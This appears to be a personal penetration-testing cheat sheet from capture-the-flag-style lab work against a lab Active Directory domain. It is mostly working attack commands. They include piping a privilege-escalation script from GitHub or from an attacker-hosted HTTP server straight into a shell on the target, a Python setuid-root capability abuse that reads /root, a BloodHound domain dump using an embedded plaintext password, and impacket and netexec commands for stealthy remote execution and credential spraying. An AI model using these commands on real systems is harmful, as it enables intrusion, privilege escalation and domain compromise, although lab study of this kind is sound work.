In-memory execution
```
curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

build
```
gcc exploit.c -o exploit
```
run
```
chmod +x exploit
./exploit
```

one line
```
gcc exploit.c -o exploit;chmod +x exploit;./exploit
```
------------------------
if there is no internet
on your
```
curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh
```
tag -o -- save to file
```
python3 -m http.server 8000
```

on the target
```
curl http://<your_machine_IP>:8000/linpeas.sh | sh
```

```
chmod +x linpeas.sh
./linpeas.sh
```

search for Linux capabilities files
```
getcap -r /2>/dev/null
```

Found Python with elevated privileges

import os
os.setuid(0) # Change the thread process UID to 0 (root)
List files in a specific folder (e.g., /root):
os.listdir('/root')
print(open('/root/root.txt').read()) # read contents

1. Domain structure exploration and Active Directory database dump

This command is the very "blood" (`bloodhound-python`). It bypassed server restrictions (LDAP signing) when we forced it to use the secure port 636 with the --use-ldaps flag. With it, you completely closed the **OBJ-06** target (Attack Mapping Data Collection).

```
bloodhound-python -u 'anderson.w' -p 'R3dT3am@Acc3ss#01' -d 'danglingtree.htb' -dc 'dc.danglingtree.htb' -c All -ns 10.129.89.89 --use-ldaps
```

- **Result:** The entire domain database was successfully downloaded. JSON files with all users, groups, and their permissions were created in the current folder.

/////////////////////////////////////////////////
SYSTEM SEARCH FOR WHERE YOU CAN LOG IN WITH A USER AND PASSWORD

1. Impacket Block (The most common for remote command execution)

If WinRM is closed, Windows allows you to execute commands via the RPC, SMB, and WMI protocols. Data is entered into these utilities in plain text:

- **`impacket-wmiexec`** — executes commands via the WMI protocol (port 135). It operates more stealthily than psexec and is often open to regular users.

```
impacket-wmiexec 'domain/user:password@IP'
```

- **`impacket-dcomexec`** — semi-automatic execution of commands via DCOM objects (ports 135/445). Helpful if the server has a robust antivirus.
```
impacket-dcomexec 'domain/user:password@IP'
```

- **`impacket-smbexec`** — creates a temporary service via SMB (port 445). Works slightly differently than psexec and sometimes picks up where the latter failed.

```
impacket-smbexec 'domain/user:password@IP'
```

---

2. NetExec / CrackMapExec Block (Automatic "Where it'll work")

These are the best utilities for skipping guesswork and simply "pointing" an account to all server ports at once. They accept the `-u` (user) and `-p` (password) parameters.

- **Check via WinRM:** (If evil-winrm is slow, this module will show whether the port itself is responding).

```
netexec winrm IP -u 'user' -p 'password' -d 'domain'
```

- **Check via SMB (port 445):** will show whether the user is a local administrator (it will print `Pwn3d!`).

```
netexec smb IP -u 'user' -p 'password' -d 'domain'
```

- **Check via RDP (port 3389):** quickly checks if the user can log in without opening a graphical window.

```
netexec rdp IP -u 'user' -p 'password' -d 'domain'
```

---
IF RDP COMMITS ABOUT A CERTIFICATE, THEN THE PROBLEM MAY BE BEING CONNECTED TO THE SAME IP ADDRESS, WHICH HAS THE CERTIFICATE SAVED. To clear it:
You simply need to delete this old, stuck certificate from Kali's memory.

```
rm /home/makdaker/.config/freerdp/server/10.129.89.89_3389.pem
```
